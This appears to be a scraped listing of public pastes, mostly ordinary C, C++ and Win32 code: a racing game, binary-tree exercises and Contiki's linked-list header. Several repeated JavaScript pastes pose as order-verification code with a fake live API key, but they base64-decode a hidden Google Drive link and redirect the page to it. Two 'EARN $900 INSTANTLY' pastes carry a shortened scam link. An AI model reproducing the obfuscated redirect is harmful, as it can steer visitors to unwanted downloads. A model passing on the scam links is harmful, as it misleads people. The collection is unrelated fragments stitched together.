            DeleteObject(aiHeadlightBrush);

            // Draw AI Windows (relative coords)
            HBRUSH aiWinBrush = CreateSolidBrush(RGB(60, 60, 60)); // Dark Gray
            HGDIOBJ oldAiWinBrush = SelectObject(memDC, aiWinBrush);
            int aiWsWidth = CAR_WIDTH * 3 / 4;
            int aiWsHeight = CAR_HEIGHT / 5;
            int aiWsY = -CAR_HEIGHT / 2 + 25 + 10; // Near ""top"" edge
            Rectangle(memDC, -aiWsWidth / 2, aiWsY, aiWsWidth / 2, aiWsY + aiWsHeight); // Windscreen
            int aiSideWWidth = CAR_WIDTH / 8;
            int aiSideWHeight = CAR_HEIGHT / 4;
            int aiSideWY = aiWsY + aiWsHeight / 2 - aiSideWHeight / 2 + 10; // Centered vertically
            int aiSideWXOffset = CAR_WIDTH / 2 - 5 - aiSideWWidth / 2; // Offset from center
            Rectangle(memDC, -aiSideWXOffset - aiSideWWidth / 2, aiSideWY, -aiSideWXOffset + aiSideWWidth / 2, aiSideWY + aiSideWHeight); // Left
            Rectangle(memDC, aiSideWXOffset - aiSideWWidth / 2, aiSideWY, aiSideWXOffset + aiSideWWidth / 2, aiSideWY + aiSideWHeight); // Right
            SelectObject(memDC, oldAiWinBrush);
            DeleteObject(aiWinBrush);

            // Draw AI Tyres (relative coords)
            HBRUSH aiTyreBrush = CreateSolidBrush(RGB(0, 0, 0));
            HGDIOBJ oldAiTyreBrush = SelectObject(memDC, aiTyreBrush);
            int aiTyreWidth = 10;
            int aiTyreHeight = 15;

            // Keeping original vertical positions:
            int aiFrontTyreY = -CAR_HEIGHT / 2 + 15; // Original front Y position
            int aiRearTyreY = CAR_HEIGHT / 2 - aiTyreHeight - 5; // Original rear Y position

            // Adjust horizontal positions to stick to the edges of the car
            int aiLeftTyreX = -CAR_WIDTH / 2; // Left edge of the car
            int aiRightTyreX = CAR_WIDTH / 2;  // Right edge of the car

            // Draw tyres at the left and right positions
            // Front Left Tyre
            Rectangle(memDC, aiLeftTyreX - aiTyreWidth / 2, aiFrontTyreY, aiLeftTyreX + aiTyreWidth / 2, aiFrontTyreY + aiTyreHeight); // FL
            // Front Right Tyre
            Rectangle(memDC, aiRightTyreX - aiTyreWidth / 2, aiFrontTyreY, aiRightTyreX + aiTyreWidth / 2, aiFrontTyreY + aiTyreHeight); // FR
            // Rear Left Tyre
            Rectangle(memDC, aiLeftTyreX - aiTyreWidth / 2, aiRearTyreY, aiLeftTyreX + aiTyreWidth / 2, aiRearTyreY + aiTyreHeight); // RL
            // Rear Right Tyre
            Rectangle(memDC, aiRightTyreX - aiTyreWidth / 2, aiRearTyreY, aiRightTyreX + aiTyreWidth / 2, aiRearTyreY + aiTyreHeight); // RR

            SelectObject(memDC, oldAiTyreBrush);
            DeleteObject(aiTyreBrush);

            // Restore AI DC state
            RestoreDC(memDC, savedDCAi);
            SelectObject(memDC, oldBlueBrush);
            DeleteObject(blueBrush);


            // --- Draw Overlay Text ---
            SetBkMode(memDC, TRANSPARENT); // Make text background transparent

            // Timer display (only before game starts)
            if (!gameStarted && timer > 0)
            {
                char timerText[10];
                // Display seconds correctly (integer division), ensure >= 1
                int secondsLeft = max(1, (timer + FPS - 1) / FPS);
                sprintf_s(timerText, ""%d"", secondsLeft);
                SetTextColor(memDC, RGB(255, 255, 0)); // Yellow countdown
                HFONT hFont = CreateFont(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L""Arial"");
                HFONT oldFont = (HFONT)SelectObject(memDC, hFont);
                SetTextAlign(memDC, TA_CENTER | TA_BASELINE); // Center align text
                TextOutA(memDC, WIDTH / 2, HEIGHT / 2, timerText, strlen(timerText));
                SetTextAlign(memDC, TA_LEFT | TA_TOP); // Reset alignment
                SelectObject(memDC, oldFont); // Restore old font
                DeleteObject(hFont); // Delete created font
            }
            else if (!gameStarted && timer <= 0) {
                // Optionally display ""GO!"" briefly
            }


            // God Mode Status Display
            if (godMode)
            {
                SetTextColor(memDC, RGB(0, 255, 0)); // Green text for God Mode
                HFONT hFont = CreateFont(20, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L""Arial"");
                HFONT oldFont = (HFONT)SelectObject(memDC, hFont);
                TextOutA(memDC, 10, 10, ""God Mode ON (G)"", 15);
                SelectObject(memDC, oldFont);
                DeleteObject(hFont);
            }

            // --- Double Buffering End ---
            BitBlt(hdc, 0, 0, clientRect.right, clientRect.bottom, memDC, 0, 0, SRCCOPY);

            // --- Cleanup ---
            SelectObject(memDC, oldBitmap);
            DeleteObject(memBitmap);
            DeleteDC(memDC);

            EndPaint(hWnd, &ps);
        }
        break; // End WM_PAINT
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        if (wParam == VK_F1)
        {
            MessageBoxW(hWnd, L""2D Racing Game 3.0 Programmed in C++ Win32 API (491 lines of code) by Entisoft Software (c) Evans Thorpemorton"", L""About"", MB_OK | MB_ICONINFORMATION); // orig 395 lines
        }
        //break;
        if (wParam == VK_ESCAPE)
        {
            PostQuitMessage(0);
        }
        break;

        // Add WM_ERASEBKGND to prevent default background flicker
    case WM_ERASEBKGND:
        return 1; // Indicate that we handled background erasing (by not doing it)

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}
```"
E6VgRd7w,Products.js,SpawnKz,JavaScript,Saturday 19th of April 2025 06:36:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97807/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ctvwdpSZ,EARN $900 INSTANTLY 2025 XH,moimoi1,JavaScript,Saturday 19th of April 2025 06:33:38 AM CDT," 
Pdf https://tinyurl.com/privguidee


TGviXduyfY
"
cFma0qy9,Order.js,SpawnKz,JavaScript,Saturday 19th of April 2025 06:21:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46333/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BpFUngq8,EARN $900 INSTANTLY 2025 XH,wrestlingdelivery,JavaScript,Saturday 19th of April 2025 06:08:34 AM CDT," 
Pdf https://tinyurl.com/privguidee


4vaCOZ3YmT
"
KfT2N8Hg,Market.js,SpawnKz,JavaScript,Saturday 19th of April 2025 06:05:54 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75022/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UqRy9RCr,dataNone,TestGuy1,JSON,Saturday 19th of April 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b6b67b466a42db05a96d68cb67f7483bb606019f73b0df55219b1a2d7eaf8bc0bff9c4b78b8e38bff52e02a3fd5664d2ed58321cd3f00c95415534d8cd0f375efbea70057c6b84c12442e383ade0411ecf79642dcfc7aaa1abda0110703f70b858f731393dd9ba9bd63fd6e1c4fa80be06d5e811ddcc0838a7c955f1e85258a7',
  otherdata: [
    '78f30884fff39b844503197dd4549fba',
    '81d86e307142e97a8428d9b9b39ba5f4',
    '04fe182922b9530686bd9c504ef0d551',
    'adf55fd5c413d04d1a0a2aac68f8e624',
    '1f7160f37aa4905ff298c1abedc01087',
    '93f0be3816a147b9fb98a48cbe1c7483',
    'f00931417959291b804ce4b72edb5636',
    'a69cf7ac224de98b01fda24803e97321'
  ]
}"
C7iBFcpH,Untitled,SpawnKz,JavaScript,Saturday 19th of April 2025 05:50:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32266/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CbmmUNTc,Products.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 05:32:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10771/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uzgu5Ptx,Order.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 05:16:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58206/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FGR03g8d,tree7_sum_subtree,Korotkodul,C++,Saturday 19th of April 2025 05:01:36 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    //vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

    // Создает поддерево
    node* create_subtree(node* par, int Li, int Ri, const vector <int> &arr) {
        if (Li > Ri) return nullptr; // Проверка на правильные границы

        node* root = new node(par);
        root->val = arr[(Ri + Li) / 2]; // устанавливаем значение корня

        // Создание левого и правого поддеревьев
        root->l = create_subtree(root, Li, (Ri + Li) / 2 - 1, arr);
        root->r = create_subtree(root, (Ri + Li) / 2 + 1, Ri, arr);

        return root; // Возвращаем указатель на созданный узел
    }

    // Инициализация дерева
    void create(const vector <int> &arr) {
        cur_size = arr.size();
        if (arr.size() == 0) {
            main_root = nullptr; // В случае пустого массива
        } else {
            main_root = create_subtree(nullptr, 0, arr.size() - 1, arr);
        }
        cout << ""Tree created\n"";
    }

    // Обход дерева (in-order)
    void trav(node* root) {
        if (root == nullptr) return; // Проверка на nullptr
        trav(root->l); // Обход левого поддерева
        cout << root->val << "" ""; // Обработка текущего узла
        trav(root->r); // Обход правого поддерева
    }

    void replace_el(node* root, int Li, int Ri, int i, int x) {
        if (root == nullptr) return;

        int mid = (Li + Ri) / 2;
        if (i == mid) {  // Нашли узел, который нужно заменить
            root->val = x;
            return;
        }

        if (i < mid) {
            replace_el(root->l, Li, mid - 1, i, x);  // Ищем в левом поддереве
        } else {
            replace_el(root->r, mid + 1, Ri, i, x);  // Ищем в правом поддереве
        }
    }

    void del(node* &root) {
        if (root == nullptr) {
            return;
        }
        del(root->l);
        del(root->r);
        if (root->l == nullptr && root->r == nullptr) {
            cout << ""clidren already nullptr\n"";
        }
        cout << ""del:"" << root->val << ""\n"";
        delete root;
        root = nullptr;
        if (root == nullptr) {
            cout << ""successfully deleted\n"";
            cout << ""\n"";
        }
    }

    int sum_subtree(node* &root) {
        if (root == nullptr) {
            return 0;
        }
        if (root->l == nullptr && root->r == nullptr) {
            int res = root->val;
            root->val = 0;
            return res;
        }
        int L = sum_subtree(root->l);
        int R = sum_subtree(root->r);
        int old_val = root->val;
        root->val = L + R;
        if (root == main_root) {
            root->val += old_val;
        }
        return  old_val + L + R;
    }
};

bool cmp(node* root1, node* root2) {
     if  (root1 == nullptr) {
        if (root2 != nullptr) {
            return 0;
        }
        return 1;
     }  else if(root2 == nullptr){
         if (root1 != nullptr) {
            return 0;
         }
         return 1;
     }
     if (root1->val != root2->val) {
        return 0;
     }
     bool L = cmp(root1->l, root2->l);
     bool R = cmp(root1->r, root2->r);
     return L & R;
}


bool cmp_tree(tree T1, tree T2) {
    bool ans = cmp(T1.main_root, T2.main_root);
    return ans;
}

int main() {
    /*cin.tie(0);
    cout.tie(0);
    ios::sync_with_stdio(false);*/
    tree T1, T2;
    vector<int> a = {1, 2, 3, 4, 5, 6, 7, 8};
    T1.create(a);
    T1.trav(T1.main_root); cout << ""\n"";
    int tree_sum = T1.sum_subtree(T1.main_root);
    T1.trav(T1.main_root);
    return 0;
}
"
E12Yi0h7,Market.js,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 05:01:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24616/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
c5R22uYZ,test_list.c,_Lunar,C,Saturday 19th of April 2025 04:59:27 AM CDT,"#include ""list.h""
#include <stdio.h>

// Using the same node structure I defined in list.h
struct my_node {
    struct my_node *next;
    int value;
};

int main() {
    LIST(my_list);

    // Creating Nodes on the stack
    struct my_node item1, item2, item3;

    // Adding Nodes To ""my_list""
    list_add(my_list, &item1);
    list_add(my_list, &item2);
    list_push(my_list, &item3);

    // Pairing Up Node Memory Addresses with integer values
    list_item_set_value(&item1, 42);
    list_item_set_value(&item2, 100);
    list_item_set_value(&item3, 69);

    // Using list_remove()
    list_remove(my_list, &item2);

    // Using list_tail()
    printf(""list_tail()\n"");
    struct my_node *tail_node = (struct my_node *)list_tail(my_list);
    if (tail_node != NULL) {
      printf(""Tail Node: %d\n"", tail_node->value);
    } else {
        printf(""Tail Node: List was empty\n"");
    }

    // Using list_length()
    printf(""List Length: %d\n"", list_length(my_list));

    // Using list_insert()
    struct my_node new_node;
    list_insert(my_list, &item3, &new_node);
    list_item_set_value(&new_node, 5);

    // Using list_length() the second time
    printf(""List Length: %d\n"", list_length(my_list));

    // Using list_contains()
    printf(""Contains new_node? : %d\n"", list_contains(my_list, &new_node));

    // Using list_chop()
    printf(""list_chop()\n"");
    for (int x = 0; x < 3; x++) {
      struct my_node *chopped_node = (struct my_node *)list_chop(my_list);
      if (chopped_node != NULL) {
          printf(""Chopped Node: %d\n"", chopped_node->value);
      } else {
          printf(""Chopped Node: List was empty\n"");
      }
    }

    return 0;
}"
rwrctk8D,list.h,_Lunar,C,Saturday 19th of April 2025 04:54:34 AM CDT,"/*
 * Copyright (c) 2004, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 * may be used to endorse or promote products derived from this software
 * without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 * Author: Adam Dunkels <adam@sics.se>
 *
 */

/**
 * \file
 * Linked list manipulation routines.
 * \author Adam Dunkels <adam@sics.se>
 *
 */

/** \addtogroup data
     @{ */
/**
 * \defgroup list Linked list library
 *
 * The linked list library provides a set of functions for
 * manipulating linked lists.
 *
 * A linked list is made up of elements where the first element \b
 * must be a pointer. This pointer is used by the linked list library
 * to form lists of the elements.
 *
 * Lists are declared with the LIST() macro. The declaration specifies
 * the name of the list that later is used with all list functions.
 *
 * Lists can be manipulated by inserting or removing elements from
 * either sides of the list (list_push(), list_add(), list_pop(),
 * list_chop()). A specified element can also be removed from inside a
 * list with list_remove(). The head and tail of a list can be
 * extracted using list_head() and list_tail(), respectively.
 *
 * This library is not safe to be used within an interrupt context.
 * @{
 */

 #ifndef LIST_H_
 #define LIST_H_

 #include <stdbool.h>
 #include <stddef.h>

 #define LIST_CONCAT2(s1, s2) s1##s2
 #define LIST_CONCAT(s1, s2) LIST_CONCAT2(s1, s2)

 /**
  * Declare a linked list.
  *
  * This macro declares a linked list with the specified \c type. The
  * type \b must be a structure (\c struct) with its first element
  * being a pointer. This pointer is used by the linked list library to
  * form the linked lists.
  *
  * The list variable is declared as static to make it easy to use in a
  * single C module without unnecessarily exporting the name to other
  * modules.
  *
  * \param name The name of the list.
  */
 #define LIST(name) \
          static void *LIST_CONCAT(name,_list) = NULL; \
          static list_t name = (list_t)&LIST_CONCAT(name,_list)

 /**
  * Declare a linked list inside a structure declaraction.
  *
  * This macro declares a linked list with the specified \c type. The
  * type \b must be a structure (\c struct) with its first element
  * being a pointer. This pointer is used by the linked list library to
  * form the linked lists.
  *
  * Internally, the list is defined as two items: the list itself and a
  * pointer to the list. The pointer has the name of the parameter to
  * the macro and the name of the list is a concatenation of the name
  * and the suffix ""_list"". The pointer must point to the list for the
  * list to work. Thus the list must be initialized before using.
  *
  * The list is initialized with the LIST_STRUCT_INIT() macro.
  *
  * \param name The name of the list.
  */
 #define LIST_STRUCT(name) \
          void *LIST_CONCAT(name,_list); \
          list_t name

 /**
  * Initialize a linked list that is part of a structure.
  *
  * This macro sets up the internal pointers in a list that has been
  * defined as part of a struct. This macro must be called before using
  * the list.
  *
  * \param struct_ptr A pointer to the struct
  * \param name The name of the list.
  */
 #define LIST_STRUCT_INIT(struct_ptr, name)                                    \
  do {                                                                       \
           (struct_ptr)->name = &((struct_ptr)->LIST_CONCAT(name,_list));   \
           (struct_ptr)->LIST_CONCAT(name,_list) = NULL;                   \
           list_init((struct_ptr)->name);                                   \
  } while(0)

 /**
  * The linked list type.
  */
 typedef void ** list_t;

 /**
  * The non-modifiable linked list type.
  */
 typedef void *const *const_list_t;

 /**
  * The base structure for list nodes.
  * All structures that will be used with the list library must
  * have this structure as their first element.
  */

 /**
  * Initialize a list.
  *
  * This function initalizes a list. The list will be empty after this
  * function has been called.
  *
  * \param list The list to be initialized.
  */
 static inline void
 list_init(list_t list)
 {
  *list = NULL;
 }

 /**
  * Get a pointer to the first element of a list.
  *
  * This function returns a pointer to the first element of the
  * list. The element will \b not be removed from the list.
  *
  * \param list The list.
  * \return A pointer to the first element on the list.
  *
  * \sa list_tail()
  */
 static inline void *
 list_head(const_list_t list)
 {
  return *list;
 }

 /**
  * Get the tail of a list.
  *
  * This function returns a pointer to the elements following the first
  * element of a list. No elements are removed by this function.
  *
  * \param list The list
  * \return A pointer to the element after the first element on the list.
  *
  * \sa list_head()
  */
 void * list_tail(const_list_t list);

 /**
  * Remove the first object on a list.
  *
  * This function removes the first object on the list and returns a
  * pointer to it.
  *
  * \param list The list.
  * \return Pointer to the removed element of list.
  */
 void * list_pop (list_t list);

 /**
  * Add an item to the start of the list.
  */
 void   list_push(list_t list, void *item);

 /**
  * Remove the last object on the list.
  *
  * This function removes the last object on the list and returns it.
  *
  * \param list The list
  * \return The removed object
  *
  */
 void * list_chop(list_t list);

 /**
  * Add an item at the end of a list.
  *
  * This function adds an item to the end of the list.
  *
  * \param list The list.
  * \param item A pointer to the item to be added.
  *
  * \sa list_push()
  *
  */
 void   list_add(list_t list, void *item);

 /**
  * Remove a specific element from a list.
  *
  * This function removes a specified element from the list.
  *
  * \param list The list.
  * \param item The item that is to be removed from the list.
  *
  */
 void   list_remove(list_t list, const void *item);

 /**
  * Get the length of a list.
  *
  * This function counts the number of elements on a specified list.
  *
  * \param list The list.
  * \return The length of the list.
  */
 int    list_length(const_list_t list);

 /**
  * Duplicate a list.
  *
  * This function duplicates a list by copying the list reference, but
  * not the elements.
  *
  * \note This function does \b not copy the elements of the list, but
  * merely duplicates the pointer to the first element of the list.
  *
  * \param dest The destination list.
  * \param src The source list.
  */
 static inline void
 list_copy(list_t dest, const_list_t src)
 {
  *dest = *src;
 }

 /**
  * \brief     Insert an item after a specified item on the list
  * \param list The list
  * \param previtem The item after which the new item should be inserted
  * \param newitem   The new item that is to be inserted
  * \author    Adam Dunkels
  *
  * This function inserts an item right after a specified
  * item on the list. This function is useful when using
  * the list module to ordered lists.
  *
  * If previtem is NULL, the new item is placed at the
  * start of the list.
  *
  */
 void   list_insert(list_t list, void *previtem, void *newitem);

 /**
  * \brief     Get the next item following this item
  * \param item A list item
  * \returns   A next item on the list
  *
  * This function takes a list item and returns the next
  * item on the list, or NULL if there are no more items on
  * the list. This function is used when iterating through
  * lists.
  */
 static inline void *
 list_item_next(const void *item)
 {
  struct list {
    struct list *next;
  };
  return item == NULL ? NULL : ((struct list *)item)->next;
 }

 /**
  * \brief     Check if the list contains an item
  * \param list The list that is checked
  * \param item An item to look for in the list
  * \returns   0 if the list does not contains the item, and 1 otherwise
  *
  * This function searches for an item in the list and returns
  * 0 if the list does not contain the item, and 1 if the item
  * is present in the list.
  */
 bool list_contains(const_list_t list, const void *item);

 /* MODIFICATION: Adding headers for our new functions in list.c */
 int list_item_get_value(const void *item);
 void list_item_set_value(void *item, int value);

 #endif /* LIST_H_ */

 /** @} */
 /** @} */"
RYeFJzNb,Untitled,Ratqueenkslskskwkw,JavaScript,Saturday 19th of April 2025 04:46:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20471/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CJFyVkif,tree6_del,Korotkodul,C++,Saturday 19th of April 2025 04:05:15 AM CDT,"#include <iostream>
#include <vector>
using namespace std;

const int inf = 2e9;

struct node {
    node* parent;
    node* l;
    node* r;
    int val;

    node(node* par) : parent(par), l(nullptr), r(nullptr), val(inf) {}
    node() : parent(nullptr), l(nullptr), r(nullptr), val(inf) {}
};

struct tree {
    //vector<int> arr; // используется ТОЛЬКО для инициализации дерева
    node* main_root; // Изменен на указатель для удобства
    int cur_size = 0;

